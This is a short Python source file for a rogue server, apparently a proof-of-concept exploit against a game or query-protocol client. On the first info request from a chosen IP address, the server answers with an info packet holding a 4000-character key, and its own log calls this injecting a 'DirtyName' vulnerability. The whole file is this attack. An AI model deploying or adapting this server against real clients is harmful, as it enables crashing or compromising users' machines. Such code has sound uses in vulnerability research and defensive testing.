from datetime import datetime
import Server
import Packet
import Logger


class DirtyNameServer(Server.Server):
    def __init__(self, injected_ip_list, *args, **kwargs):
        super(DirtyNameServer, self).__init__(*args, **kwargs)
        self.ip_list = dict((ip, False) for ip in injected_ip_list)

    def start(self, *args, **kwargs):
        self.logger.info("Started server for injecting DirtyName vulnerability")
        super(DirtyNameServer, self).start(*args, **kwargs)

    def _get_info_handler(self, received_packet, address):
        if address[0] in self.ip_list.keys():
            if self.ip_list[address[0]] == False:
                packet = Packet.Packet()
                packet.id = Packet.TYPE_INFO_RESPONSE
                packet.info = self.info
                challenge = received_packet.id_parameter
                if challenge == "xxx":
                    packet.info["challenge"] = challenge
                else:
                    packet.info["challenge"] = challenge[:-1]

                self.logger.info("Injecting {}")
                packet.info["A" * 4000] = "b"
                self._send(packet, address)
                self.ip_list[address[0]] = True

def main():
    Logger.MainLogger.log_to_file(datetime.now().strftime("Logs\\%Y_%m_%d_%H_%M_%S.log"))
    server = DirtyNameServer(["192.168.84.1"], "0.0.0.0", 20103)
    server.start()
    Logger.MainLogger.close()

if __name__ == "__main__":
    main()